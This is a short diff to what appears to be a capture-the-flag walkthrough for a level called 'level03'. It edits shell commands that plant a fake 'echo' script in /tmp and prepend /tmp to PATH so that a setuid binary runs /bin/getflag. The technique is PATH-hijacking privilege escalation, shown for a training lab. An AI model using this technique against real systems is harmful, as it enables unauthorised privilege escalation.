@@ -46,7 +46,7 @@ the saved set-user|group-ID of the calling process
 ```b
 > whereis getflag
 getflag: /bin/getflag
-> echo -e "#\!/bin/bash\n/bin/getflag" > /tmp/echo
+> echo -e "/bin/getflag" > /tmp/echo
 > chmod +x /tmp/echo
 > export PATH=/tmp:$PATH  👈 prepend tmp to get it checked first
 > ./level03
